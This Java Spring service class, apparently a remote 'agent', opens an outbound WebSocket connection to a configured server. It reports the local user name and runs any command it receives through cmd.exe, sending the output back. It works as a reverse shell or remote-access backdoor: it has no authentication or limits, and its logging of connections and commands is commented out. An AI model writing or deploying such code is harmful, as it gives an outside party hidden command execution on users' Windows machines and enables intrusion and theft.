package com.agent.service;

import org.springframework.web.socket.client.WebSocketClient;
import org.springframework.web.socket.client.standard.StandardWebSocketClient;
import org.springframework.web.socket.WebSocketHandler;
import org.springframework.web.socket.WebSocketSession;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.handler.TextWebSocketHandler;
import org.springframework.web.socket.client.WebSocketConnectionManager;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.*;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;

@Service
public class WebSocketService {

  private static final Logger logger = LoggerFactory.getLogger(WebSocketService.class);
  
  @Value("${websocket.url}")
  private String WEBSOCKET_URL;

  public void connect() {
    WebSocketClient client = new StandardWebSocketClient();

    WebSocketHandler webSocketHandler = new TextWebSocketHandler() {
      @Override
      public void afterConnectionEstablished(WebSocketSession session) throws Exception {
        // logger.info("Connected");
      }

      @Override
      protected void handleTextMessage(WebSocketSession session, TextMessage message) throws Exception {
        String msg = message.getPayload();

        if (msg.equals("username request")) {
          session.sendMessage(new TextMessage(System.getProperty("user.name")));
        } else {
          if (msg.contains("cmd:")) {
            var command = msg.split(":")[1].replace("\"", "").trim();
            // logger.info(command);
            executeCommand(command, session);
          } else {
            logger.info(msg);
          }
          // executeCommand(msg, session);
        }
      }

      @Override
      public void handleTransportError(WebSocketSession session, Throwable exception) throws Exception {
        logger.error("Error: " + exception.getMessage());
      }
    };

    WebSocketConnectionManager connectionManager = new WebSocketConnectionManager(
      client, webSocketHandler,
      WEBSOCKET_URL
    );
    connectionManager.start();
  }

  private void executeCommand(String command, WebSocketSession session) throws IOException {
    StringBuilder output = new StringBuilder();

    try {
      ProcessBuilder processBuilder = new ProcessBuilder("cmd.exe", "/c", command);
      processBuilder.redirectErrorStream(true);

      Process process = processBuilder.start();
      BufferedReader reader = new BufferedReader(
        new InputStreamReader(process.getInputStream(), Charset.forName("IBM850"))
      );

      String line;
      while ((line = reader.readLine()) != null) {
        output.append(line).append("\n");
      }

      process.waitFor();

      session.sendMessage(new TextMessage(output.toString()));
      logger.info(output.toString());
    } catch (IOException | InterruptedException e) {
      session.sendMessage(new TextMessage("Error: " + e.getMessage()));
    }
  }
}